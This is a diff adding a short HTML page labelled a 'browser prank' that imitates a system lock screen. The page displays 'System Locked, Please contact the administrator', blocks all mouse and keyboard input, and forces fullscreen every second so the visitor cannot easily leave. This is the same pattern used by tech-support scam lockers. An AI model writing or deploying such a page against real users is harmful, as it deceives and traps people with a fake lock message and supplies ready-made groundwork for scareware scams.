@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>System Blocker (Browser Prank)</title>
+    <style>
+        body {
+            background: black;
+            color: white;
+            text-align: center;
+            font-family: sans-serif;
+            margin-top: 20%;
+        }
+    </style>
+</head>
+<body>
+    <h1>⚠ System Locked ⚠</h1>
+    <p>Please contact the administrator.</p>
+
+    <script>
+    // Block mouse events
+    document.addEventListener('contextmenu', e => e.preventDefault());
+    document.addEventListener('mousedown', e => e.preventDefault());
+    document.addEventListener('mouseup', e => e.preventDefault());
+    document.addEventListener('click', e => e.preventDefault());
+    document.addEventListener('mousemove', e => e.preventDefault());
+
+    // Block keyboard events
+    document.addEventListener('keydown', e => e.preventDefault());
+    document.addEventListener('keypress', e => e.preventDefault());
+    document.addEventListener('keyup', e => e.preventDefault());
+
+    // Force fullscreen repeatedly
+    function forceFullscreen() {
+        let elem = document.documentElement;
+        if (elem.requestFullscreen) {
+            elem.requestFullscreen();
+        } else if (elem.webkitRequestFullscreen) {
+            elem.webkitRequestFullscreen();
+        } else if (elem.mozRequestFullScreen) {
+            elem.mozRequestFullScreen();
+        } else if (elem.msRequestFullscreen) {
+            elem.msRequestFullscreen();
+        }
+    }
+    setInterval(forceFullscreen, 1000);
+    </script>
+</body>
+</html>
